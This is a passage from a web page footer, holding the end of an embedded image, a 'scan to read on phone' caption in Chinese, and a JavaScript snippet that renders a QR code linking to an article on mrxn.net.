pnHsLnOqE1ozhHxY2aPVe48lvLeNXHfBuIiY2v3YE9kNfu/3T3/wAAAP//TJlS9gAAAAZJREFUAwCj/aZuBvdqNgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-addons-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 